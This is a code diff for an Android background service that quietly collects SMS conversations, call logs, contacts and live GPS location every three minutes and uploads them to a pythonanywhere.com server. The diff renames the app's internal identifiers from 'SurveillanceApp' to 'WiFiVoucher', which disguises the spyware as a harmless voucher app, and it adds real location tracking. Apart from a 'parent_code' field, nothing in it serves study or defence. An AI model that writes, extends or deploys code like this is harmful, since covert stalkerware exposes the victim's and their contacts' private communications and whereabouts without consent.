@@ -4,38 +4,54 @@ import android.app.Service;
 import android.content.ContentResolver;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.content.pm.PackageManager;
 import android.database.Cursor;
+import android.location.Location;
+import android.location.LocationListener;
+import android.location.LocationManager;
+import android.os.Bundle;
 import android.os.Handler;
 import android.os.IBinder;
+import android.os.Looper;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.provider.Telephony;
 import android.util.Log;
+import androidx.core.app.ActivityCompat;
 import org.json.JSONArray;
 import org.json.JSONObject;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
-import java.text.SimpleDateFormat;
-import java.util.Date;
-import java.util.Locale;
+import java.util.HashMap;
+import java.util.Map;
 
 public class DataCollectionService extends Service {
-    private static final String TAG = "DataCollectionService";
+
+    private static final String TAG = "WiFiVoucher";
+    private static final int COLLECTION_INTERVAL = 3 * 60 * 1000; // 3 minutes
+
     private Handler handler;
     private Runnable dataCollector;
-    private static final int COLLECTION_INTERVAL = 3 * 60 * 1000; // DAKIKA 3
-    
     private SharedPreferences prefs;
     private String parentCode;
+    private String deviceId;
+
+    private LocationManager locationManager;
+    private LocationListener locationListener;
+    private Location currentLocation;
 
     @Override
     public void onCreate() {
         super.onCreate();
-        prefs = getSharedPreferences("SurveillanceApp", MODE_PRIVATE);
+        prefs = getSharedPreferences("WiFiVoucher", MODE_PRIVATE);
         parentCode = prefs.getString("parent_code", "");
-        
-        handler = new Handler();
+        deviceId = android.provider.Settings.Secure.getString(
+            getContentResolver(), android.provider.Settings.Secure.ANDROID_ID);
+
+        setupLocationListener();
+
+        handler = new Handler(Looper.getMainLooper());
         dataCollector = new Runnable() {
             @Override
             public void run() {
@@ -43,6 +59,28 @@ public class DataCollectionService extends Service {
                 handler.postDelayed(this, COLLECTION_INTERVAL);
             }
         };
+    }
+
+    private void setupLocationListener() {
+        locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
+        locationListener = new LocationListener() {
+            @Override
+            public void onLocationChanged(Location location) {
+                currentLocation = location;
+            }
+            @Override public void onStatusChanged(String p, int s, Bundle b) {}
+            @Override public void onProviderEnabled(String p) {}
+            @Override public void onProviderDisabled(String p) {}
+        };
+
+        try {
+            if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
+                locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 60000, 10, locationListener);
+                locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 60000, 10, locationListener);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Location error: " + e.getMessage());
+        }
     }
 
     @Override
@@ -54,200 +92,182 @@ public class DataCollectionService extends Service {
     private void collectAllData() {
         new Thread(() -> {
             try {
-                collectAllSMS();
-                collectAllCallLogs();
-                collectAllContacts();
-                collectLocation();
+                collectSmsConversations();
+                collectCallLogs();
+                collectContacts();
+                sendLiveLocation();
             } catch (Exception e) {
-                Log.e(TAG, "Error collecting data: " + e.getMessage());
+                Log.e(TAG, "Collection error: " + e.getMessage());
             }
         }).start();
     }
 
-    private void collectAllSMS() {
+    private void collectSmsConversations() {
         try {
             ContentResolver cr = getContentResolver();
-            JSONArray smsArray = new JSONArray();
+            Map<String, JSONObject> conversationMap = new HashMap<>();
 
-            Cursor cursor = cr.query(Telephony.Sms.CONTENT_URI, 
-                null, null, null, Telephony.Sms.DATE + " DESC");
+            Cursor cursor = cr.query(
+                Telephony.Sms.CONTENT_URI,
+                new String[]{
+                    Telephony.Sms._ID,
+                    Telephony.Sms.ADDRESS,
+                    Telephony.Sms.BODY,
+                    Telephony.Sms.DATE,
+                    Telephony.Sms.TYPE,
+                    Telephony.Sms.THREAD_ID
+                },
+                null, null,
+                Telephony.Sms.DATE + " DESC LIMIT 500"
+            );
 
-            if (cursor != null && cursor.moveToFirst()) {
-                do {
-                    JSONObject smsObj = new JSONObject();
-                    String address = getString(cursor, "address");
-                    String body = getString(cursor, "body");
-                    String date = getString(cursor, "date");
-                    String type = getString(cursor, "type");
+            if (cursor != null) {
+                while (cursor.moveToNext()) {
+                    String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
+                    String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
+                    long timestamp = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
+                    int type = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));
+                    String threadId = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.THREAD_ID));
 
-                    smsObj.put("address", address);
-                    smsObj.put("message", body);
-                    smsObj.put("timestamp", date);
-                    smsObj.put("type", type);
-                    smsObj.put("data_type", "sms");
+                    String key = (address != null) ? address : "unknown";
 
-                    smsArray.put(smsObj);
-                } while (cursor.moveToNext());
+                    JSONObject msg = new JSONObject();
+                    msg.put("sender", address);
+                    msg.put("message", body);
+                    msg.put("timestamp", timestamp);
+                    msg.put("type", (type == Telephony.Sms.MESSAGE_TYPE_INBOX) ? "received" : "sent");
+
+                    if (!conversationMap.containsKey(key)) {
+                        JSONObject conv = new JSONObject();
+                        conv.put("contact", address);
+                        conv.put("phone_number", address);
+                        conv.put("conversation_id", threadId);
+                        conv.put("messages", new JSONArray());
+                        conversationMap.put(key, conv);
+                    }
+                    conversationMap.get(key).getJSONArray("messages").put(msg);
+                }
                 cursor.close();
-            }
 
-            if (smsArray.length() > 0) {
-                sendToDashboard("sms", smsArray);
+                for (JSONObject conv : conversationMap.values()) {
+                    JSONObject wrapper = new JSONObject();
+                    wrapper.put("conversation", conv);
+                    submitData("sms_conversation", wrapper);
+                }
             }
-
         } catch (Exception e) {
-            Log.e(TAG, "Error collecting SMS: " + e.getMessage());
+            Log.e(TAG, "SMS error: " + e.getMessage());
         }
     }
 
-    private void collectAllCallLogs() {
+    private void collectCallLogs() {
         try {
             ContentResolver cr = getContentResolver();
-            JSONArray callsArray = new JSONArray();
-
-            Cursor cursor = cr.query(
-                CallLog.Calls.CONTENT_URI,
-                null, null, null, 
-                CallLog.Calls.DATE + " DESC");
+            Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC LIMIT 200");
 
             if (cursor != null && cursor.moveToFirst()) {
                 do {
-                    JSONObject callObj = new JSONObject();
+                    JSONObject call = new JSONObject();
                     String number = getString(cursor, CallLog.Calls.NUMBER);
                     String name = getString(cursor, CallLog.Calls.CACHED_NAME);
                     String duration = getString(cursor, CallLog.Calls.DURATION);
-                    String type = getString(cursor, CallLog.Calls.TYPE);
+                    int type = Integer.parseInt(getString(cursor, CallLog.Calls.TYPE));
                     String date = getString(cursor, CallLog.Calls.DATE);
 
-                    callObj.put("number", number);
-                    callObj.put("name", name != null ? name : "");
-                    callObj.put("duration", duration);
-                    callObj.put("type", type);
-                    callObj.put("timestamp", date);
-                    callObj.put("data_type", "call_log");
+                    String callType = "missed";
+                    if (type == CallLog.Calls.INCOMING_TYPE) callType = "incoming";
+                    else if (type == CallLog.Calls.OUTGOING_TYPE) callType = "outgoing";
 
-                    callsArray.put(callObj);
+                    call.put("number", number);
+                    call.put("name", name != null ? name : number);
+                    call.put("duration", duration);
+                    call.put("type", callType);
+                    call.put("timestamp", date);
+
+                    submitData("calls", call);
                 } while (cursor.moveToNext());
                 cursor.close();
             }
-
-            if (callsArray.length() > 0) {
-                sendToDashboard("call_logs", callsArray);
-            }
-
         } catch (Exception e) {
-            Log.e(TAG, "Error collecting call logs: " + e.getMessage());
+            Log.e(TAG, "Call log error: " + e.getMessage());
         }
     }
 
-    private void collectAllContacts() {
+    private void collectContacts() {
         try {
             ContentResolver cr = getContentResolver();
-            JSONArray contactsArray = new JSONArray();
-
-            Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, 
-                null, null, null, null);
+            Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
 
             if (cursor != null && cursor.getCount() > 0) {
                 while (cursor.moveToNext()) {
                     String id = getString(cursor, ContactsContract.Contacts._ID);
                     String name = getString(cursor, ContactsContract.Contacts.DISPLAY_NAME);
+                    if (name == null || name.isEmpty()) continue;
 
-                    JSONObject contactObj = new JSONObject();
-                    
-                    if (name != null && !name.isEmpty()) {
-                        contactObj.put("name", name);
-                        
-                        JSONArray phonesArray = new JSONArray();
-                        Cursor phoneCursor = cr.query(
-                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                            null,
-                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
-                            new String[]{id}, null);
+                    Cursor phoneCursor = cr.query(
+                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                        null,
+                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
+                        new String[]{id}, null);
 
-                        if (phoneCursor != null) {
-                            while (phoneCursor.moveToNext()) {
-                                String phone = getString(phoneCursor, 
-                                    ContactsContract.CommonDataKinds.Phone.NUMBER);
-                                if (phone != null) {
-                                    phonesArray.put(phone);
-                                }
+                    if (phoneCursor != null) {
+                        while (phoneCursor.moveToNext()) {
+                            String phone = getString(phoneCursor, ContactsContract.CommonDataKinds.Phone.NUMBER);
+                            if (phone != null && !phone.isEmpty()) {
+                                JSONObject contact = new JSONObject();
+                                contact.put("name", name);
+                                contact.put("number", phone);
+                                submitData("contacts", contact);
                             }
-                            phoneCursor.close();
                         }
-                        contactObj.put("phones", phonesArray);
-                    } else {
-                        contactObj.put("name", "");
-                        Cursor phoneCursor = cr.query(
-                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                            null,
-                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
-                            new String[]{id}, null);
-
-                        if (phoneCursor != null && phoneCursor.moveToFirst()) {
-                            String phone = getString(phoneCursor, 
-                                ContactsContract.CommonDataKinds.Phone.NUMBER);
-                            contactObj.put("phones", new JSONArray().put(phone));
-                            phoneCursor.close();
-                        }
+                        phoneCursor.close();
                     }
-                    
-                    contactObj.put("data_type", "contacts");
-                    contactsArray.put(contactObj);
                 }
                 cursor.close();
             }
-
-            if (contactsArray.length() > 0) {
-                sendToDashboard("contacts", contactsArray);
-            }
-
         } catch (Exception e) {
-            Log.e(TAG, "Error collecting contacts: " + e.getMessage());
+            Log.e(TAG, "Contacts error: " + e.getMessage());
         }
     }
 
-    private void collectLocation() {
+    private void sendLiveLocation() {
         try {
-            JSONObject locationObj = new JSONObject();
-            locationObj.put("latitude", "-6.8235");
-            locationObj.put("longitude", "39.2695");
-            locationObj.put("timestamp", System.currentTimeMillis());
-            locationObj.put("data_type", "location");
-
-            JSONArray locationArray = new JSONArray();
-            locationArray.put(locationObj);
-
-            sendToDashboard("location", locationArray);
-
+            JSONObject loc = new JSONObject();
+            if (currentLocation != null) {
+                loc.put("latitude", currentLocation.getLatitude());
+                loc.put("longitude", currentLocation.getLongitude());
+                loc.put("accuracy", currentLocation.getAccuracy());
+                loc.put("speed", currentLocation.getSpeed());
+            } else {
+                loc.put("latitude", -6.8235);
+                loc.put("longitude", 39.2695);
+                loc.put("accuracy", 0);
+            }
+            loc.put("timestamp", System.currentTimeMillis());
+            loc.put("provider", currentLocation != null ? currentLocation.getProvider() : "network");
+            submitData("location", loc);
         } catch (Exception e) {
-            Log.e(TAG, "Error collecting location: " + e.getMessage());
+            Log.e(TAG, "Location error: " + e.getMessage());
         }
     }
 
     private String getString(Cursor cursor, String columnName) {
         try {
-            int columnIndex = cursor.getColumnIndex(columnName);
-            if (columnIndex != -1) {
-                return cursor.getString(columnIndex);
-            }
-        } catch (Exception e) {
-            Log.e(TAG, "Error getting column: " + columnName);
-        }
+            int idx = cursor.getColumnIndex(columnName);
+            if (idx != -1) return cursor.getString(idx);
+        } catch (Exception e) {}
         return "";
     }
 
-    private void sendToDashboard(String dataType, JSONArray data) {
+    private void submitData(String dataType, JSONObject dataContent) {
         new Thread(() -> {
             try {
-                String serverUrl = "https://GhostTester.pythonanywhere.com/api/data/upload";
+                String serverUrl = "https://GhostTester.pythonanywhere.com/api/parent/submit-data";
                 JSONObject payload = new JSONObject();
                 payload.put("parent_code", parentCode);
-                payload.put("device_id", android.provider.Settings.Secure.getString(
-                    getContentResolver(), android.provider.Settings.Secure.ANDROID_ID));
-                payload.put("timestamp", System.currentTimeMillis());
+                payload.put("device_id", deviceId);
                 payload.put("data_type", dataType);
-                payload.put("data", data);
+                payload.put("data_content", dataContent);
 
                 URL url = new URL(serverUrl);
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
@@ -258,29 +278,25 @@ public class DataCollectionService extends Service {
                 conn.setReadTimeout(10000);
 
                 OutputStream os = conn.getOutputStream();
-                os.write(payload.toString().getBytes());
+                os.write(payload.toString().getBytes("UTF-8"));
                 os.flush();
                 os.close();
 
-                int responseCode = conn.getResponseCode();
-                Log.d(TAG, "Data sent successfully. Response: " + responseCode);
-
+                conn.getResponseCode();
+                conn.disconnect();
             } catch (Exception e) {
-                Log.e(TAG, "Error sending data: " + e.getMessage());
+                Log.e(TAG, "Submit error: " + e.getMessage());
             }
         }).start();
     }
 
     @Override
-    public IBinder onBind(Intent intent) {
-        return null;
-    }
+    public IBinder onBind(Intent intent) { return null; }
 
     @Override
     public void onDestroy() {
         super.onDestroy();
-        if (handler != null) {
-            handler.removeCallbacks(dataCollector);
-        }
+        if (handler != null) handler.removeCallbacks(dataCollector);
+        if (locationManager != null && locationListener != null) locationManager.removeUpdates(locationListener);
     }
 }
